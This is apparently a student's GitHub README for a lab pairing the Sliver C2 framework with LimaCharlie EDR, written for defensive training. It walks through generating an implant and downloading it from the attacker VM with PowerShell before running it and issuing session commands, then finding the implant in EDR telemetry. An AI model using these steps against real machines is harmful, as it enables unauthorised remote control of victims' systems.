# LimaCharlie-C2-EDR-Telemetry
To gain hands-on experience generating a command-and-control (C2) payload using Sliver, a post-exploitation framework, on a Linux virtual machine (VM). This payload will then be transferred to a Windows VM, simulating a malware infection. The objective is to understand the initial stages of an attack and how C2 communication is established. 

## Topology Overflow

In this virtual environment setup, the Windows and Ubuntu VMs are configured within VMware Workstation Pro, establishing a controlled and isolated lab setting. The Windows VM functions as the primary target for telemetry and endpoint detection, where security monitoring tools will capture system activities. Conversely, the Ubuntu VM serves as the attacker's system, specifically used for deploying and managing Command and Control (C2) payloads, facilitating the simulation of potential cyber threats. For enhanced security monitoring, the LimaCharlie EDR is installed on the Windows VM, providing comprehensive activity analysis, while Sysmon offers additional granular telemetry, complementing LimaCharlie’s capabilities.

Both VMs are configured with static IP addresses within the VMware NAT network, ensuring stable and consistent connectivity. This network setup is critical, as the static IP of the Ubuntu VM is essential for SSH access, enabling the execution of attack operations. Analysts utilize LimaCharlie’s web interface to delve into telemetry data, with a focus on detecting anomalies and potential malicious activities. This exploration is underpinned by an emphasis on understanding normal system behaviors, which is crucial for accurately identifying and responding to threats.
## Skills Learned

- **Post-exploitation framework utilization:** Working with Sliver to create and manage C2 payloads.
- **Basic understanding of network protocols:** Recognizing HTTP for C2 communication.
- **Malware analysis fundamentals:** Observing the behavior and characteristics of a malware payload.
- **EDR tool familiarity:** Navigating and interpreting data within the LimaCharlie platform.
- **Threat hunting basics:** Using IOCs (Indicators of Compromise) to filter and analyze telemetry.

## Tools Used

- **Sliver:** A post-exploitation framework for C2 operations.
- **Linux VM:** A virtualized operating system environment.
- **SSH:** Secure Shell protocol for remote access to the Linux VM.
- **Python:** Used to create a temporary web server for file transfer.
- **Windows VM:** A virtualized Windows operating system environment.
- **PowerShell:** A task automation and configuration management framework used to execute the payload.
- **LimaCharlie:** An EDR platform used for threat detection and analysis.
- **VirusTotal:** An online malware scanning service used to analyze the C2 payload.

## What is LimaCharlie EDR?
![Pasted image 20240626185447](https://github.com/CySAJohnseun/LimaCharlie-C2-EDR-Telemetry/assets/166464506/9a90491e-1177-47f8-8507-4bafa157d1bb)
LimaCharlie EDR (Endpoint Detection and Response) is a cloud-based security platform that provides real-time visibility into endpoint activity, enabling rapid detection and response to threats. It offers a comprehensive suite of tools for monitoring, analyzing, and responding to security events on endpoints, such as:

- **Real-time telemetry:** Streams detailed information from endpoint sensors to the cloud, allowing for immediate visibility into security events.
- **Versatile detection syntax:** Uses a YAML-based syntax that allows security teams to create custom detections tailored to their specific environments.
- **Integration with open-source and managed rulesets:** Leverages both community-driven and commercially available threat intelligence to enhance detection capabilities.
- **Vendor-agnostic telemetry ingestion:** Can ingest telemetry from various security tools and platforms, providing a unified view of endpoint security.

LimaCharlie EDR is used to observe and analyze the telemetry generated by the C2 implant deployed on the Windows VM, helping to understand the attacker's actions and develop effective detection rules.
## What is Sliver?
![Pasted image 20240626185604](https://github.com/CySAJohnseun/LimaCharlie-C2-EDR-Telemetry/assets/166464506/6d1b2cd7-9f60-4ab1-96cd-dc404f349775)
Sliver is an open-source, cross-platform adversary emulation/red team framework. It is designed to be a scalable tool that can be used by organizations of all sizes to perform security testing. It is often compared to other frameworks like Cobalt Strike or Metasploit. Sliver is used to generate a C2 (command-and-control) payload, simulating the actions of an attacker establishing communication with a compromised system.

# Steps
## Deploying Command and Control (C2) with Sliver

In this guide, we are demonstrating how to generate and deploy a Command and Control (C2) payload using Sliver, an open-source adversary simulation tool, to establish a C2 session on a Windows VM from a Linux VM. This process involves multiple steps including generating the payload, transferring it to the target system, and verifying the session. Here are the detailed steps:

1. **Accessing the Linux VM**:
    - Establish an SSH session with the Linux VM.
    - Gain root privileges and navigate to the Sliver installation directory:

```
sudo su
cd /opt/sliver
```
   

![Pasted image 20240626190758](https://github.com/CySAJohnseun/LimaCharlie-C2-EDR-Telemetry/assets/166464506/2465be14-9509-4f0e-950c-d7950f16b828)

2. **Launching the Sliver Server**:
    - Start the Sliver server:
      ```sh
      sliver-server
      ```

3. **Generating the C2 Payload**:
![Pasted image 20240626154504](https://github.com/CySAJohnseun/LimaCharlie-C2-EDR-Telemetry/assets/166464506/3c81387b-344c-4d54-8c94-b8865847a98d)
- Generate a C2 payload using the Linux VM’s static IP address and save it in the Sliver directory:

```
  generate --http [Linux_VM_IP] --save /opt/sliver
```

- Note the randomized output file name for future reference.
- Confirm the new implant configuration:
 
```
implants
```
  
![Pasted image 20240626154527](https://github.com/CySAJohnseun/LimaCharlie-C2-EDR-Telemetry/assets/166464506/68ea1e7a-8683-46d1-956d-69e7f4992e0d)
4. **Transferring the Payload to the Windows VM**:
- Exit the Sliver server:

```
exit
```

- Start a temporary Python web server to facilitate the transfer:

```
cd /opt/sliver
python3 -m http.server 80
```

![Pasted image 20240626053434](https://github.com/CySAJohnseun/LimaCharlie-C2-EDR-Telemetry/assets/166464506/ae76cd09-2463-48b4-8a42-8ef380818fe0)

- On the Windows VM, open an Administrative PowerShell console and download the payload:

```
 IWR -Uri http://[Linux_VM_IP]/[payload_name].exe -Outfile C:\Users\User\Downloads\[payload_name].exe
```


![Pasted image 20240626053832](https://github.com/CySAJohnseun/LimaCharlie-C2-EDR-Telemetry/assets/166464506/9e9d5775-9dc3-4cac-a8c7-2bcf60e36ed8)

Snapshot the Windows VM for safety:

Snapshot name: “Malware staged”


5. **Starting the Command and Control Session**:
- Terminate the Python web server on the Linux VM with `Ctrl + C`.
- Relaunch the Sliver server:

```
 sliver-server
```

- Start the HTTP listener in Sliver:
```
 http
```

- On the Windows VM, execute the C2 payload from the download location using an Administrative PowerShell prompt:

```
  C:\Users\User\Downloads\[payload_name].exe
```

6. **Verifying and Interacting with the C2 Session**:
- Verify the session in Sliver and note the Session ID:


![Pasted image 20240626191312](https://github.com/CySAJohnseun/LimaCharlie-C2-EDR-Telemetry/assets/166464506/ed8ec74b-7909-4a60-953b-6bc6b1d67895)
- Interact with the new C2 session by using the session ID:

```
use [session_id]
```


![Pasted image 20240626155205](https://github.com/CySAJohnseun/LimaCharlie-C2-EDR-Telemetry/assets/166464506/964ef961-6343-4662-a50e-00b8fa973e72)

7. **Running Basic Commands on the Victim Host**:
    - Gather basic information about the session:
![Pasted image 20240626155224](https://github.com/CySAJohnseun/LimaCharlie-C2-EDR-Telemetry/assets/166464506/a602b718-a56f-463f-aca2-2b4977d8d83a)

 ```
info
```


- Identify the user and privileges of the implant:

```
whoami
```

![Pasted image 20240626155246](https://github.com/CySAJohnseun/LimaCharlie-C2-EDR-Telemetry/assets/166464506/547d2298-379e-489c-8539-37f5c6ebf577)

```
getprivs
```

![Pasted image 20240626155309](https://github.com/CySAJohnseun/LimaCharlie-C2-EDR-Telemetry/assets/166464506/0e4ca702-0fb4-4aaf-a4cf-c7c6aff9071a)



![Pasted image 20240626155339](https://github.com/CySAJohnseun/LimaCharlie-C2-EDR-Telemetry/assets/166464506/e7768e12-9568-4d77-b539-e9d7b7421396)


```
 pwd
```

- Examine network connections:

![Pasted image 20240626155355](https://github.com/CySAJohnseun/LimaCharlie-C2-EDR-Telemetry/assets/166464506/749b1b7a-32f4-4ef2-81bf-d17f1923a9f9)


```
netstat
```

- Identify running processes:

![Pasted image 20240626055242](https://github.com/CySAJohnseun/LimaCharlie-C2-EDR-Telemetry/assets/166464506/e7c94cd0-090a-480f-a1d9-8191fdc1e8e6)


```
 ps -T
```


Through these steps, you have successfully demonstrated generating a C2 payload, transferring it to a target machine, establishing a C2 session, and interacting with the compromised system using Sliver. This process emulates the actions an attacker might take to establish and use a foothold on a victim's system for further exploitation.


## Observing and Analyzing EDR Telemetry in LimaCharlie

This tutorial provides a step-by-step guide for cybersecurity analysts to observe and analyze Endpoint Detection and Response (EDR) telemetry using the LimaCharlie platform.

1. **Accessing Sensors in LimaCharlie:**
![image](https://github.com/CySAJohnseun/LimaCharlie-C2-EDR-Telemetry/assets/166464506/17dc4400-6c9f-467e-aa48-c4366135515b)

   - Navigate to the "Sensors" section in the LimaCharlie web UI.
   - Select an active Windows sensor to begin the analysis.

3. **Exploring Processes:**
![image](https://github.com/CySAJohnseun/LimaCharlie-C2-EDR-Telemetry/assets/166464506/d9a643d1-ccc0-4134-b372-f825c0d824d2)

   - Click on the "Processes" tab for the selected sensor.
   - Examine the process tree, hover over icons to understand their representations.
   - Emphasizes the importance of familiarizing with common system processes to identify anomalies.

5. **Identifying Unusual Processes:**
![image](https://github.com/CySAJohnseun/LimaCharlie-C2-EDR-Telemetry/assets/166464506/41ac7ed7-b6ee-4258-b41c-f12468564bb7)

   - Signed processes are generally benign, but legitimate processes can be exploited.
   - Look for unsigned processes as potential indicators of unusual or malicious activity.
   - Example: A Command and Control (C2) implant that is unsigned and active on the network.
![image](https://github.com/CySAJohnseun/LimaCharlie-C2-EDR-Telemetry/assets/166464506/de173447-103e-479c-8d44-79d89f60838a)


7. **Network Analysis:**

![image](https://github.com/CySAJohnseun/LimaCharlie-C2-EDR-Telemetry/assets/166464506/874a8989-e7f6-49d7-9e0f-d932891f1e1d)

   - Click on the "Network" tab to review network connections.
   - Use Ctrl+F to search for specific implant names or C2 IP addresses.

9. **File System Inspection:**
![image](https://github.com/CySAJohnseun/LimaCharlie-C2-EDR-Telemetry/assets/166464506/1bd75876-8da2-42bf-a79b-001fc9aec8b7)

   - Click on the "File System" tab and navigate to the known location of the implant (e.g., C:\Users\User\Downloads).
   - Inspect the hash of the suspicious executable using VirusTotal.

11. **Understanding VirusTotal Results:**
![image](https://github.com/CySAJohnseun/LimaCharlie-C2-EDR-Telemetry/assets/166464506/865f223f-f894-4512-9b01-8bc2937678c3)

   - Clarifies that scanning with VirusTotal queries its database for known malware samples.
   - An unknown file on VirusTotal doesn’t imply innocence; it might be a custom-crafted or targeted sample.

13. **Timeline Analysis:**
![image](https://github.com/CySAJohnseun/LimaCharlie-C2-EDR-Telemetry/assets/166464506/6f35d454-786f-4e63-9a60-5b9c3bf053bc)

   - Click on the "Timeline" tab for a near real-time view of EDR telemetry and event logs.
   - Practice filtering the timeline using known Indicators of Compromise (IOCs) such as implant names or C2 IP addresses.
   - Track the creation, launch, and network activity of the implant.

15. **Investigating Related Events:**
![image](https://github.com/CySAJohnseun/LimaCharlie-C2-EDR-Telemetry/assets/166464506/77d2249c-c667-488a-841f-20fa12939d0d)

   - Examine events related to the implant process, such as "SENSITIVE_PROCESS_ACCESS."
   - These events will be useful for crafting detection rules later.

## Conclusion

I gain significant insights into the role of a SOC Analyst by simulating a realistic cyber-attack scenario. By using Sliver to generate and manage C2 payloads, I learn how attackers create and control malware, providing a deeper understanding of post-exploitation activities. Recognizing the importance of network protocols like HTTP for C2 communications enhances my ability to detect and analyze similar traffic in real-world scenarios. Observing the behavior and characteristics of malware payloads on a Windows VM gives me a foundational understanding of how malware operates and how to identify its presence on a system.

Navigating and interpreting data within the LimaCharlie platform equips me with the skills to use advanced EDR tools for threat detection and response effectively. Utilizing IOCs to filter and analyze telemetry data introduces me to the essentials of threat hunting, a critical skill for proactively identifying and mitigating security threats. This comprehensive hands-on experience not only enhances my technical skills but also provides practical knowledge essential for a SOC Analyst. By understanding the attack lifecycle, from initial compromise to establishing C2 communication, I am better prepared to detect, analyze, and respond to cyber threats effectively.
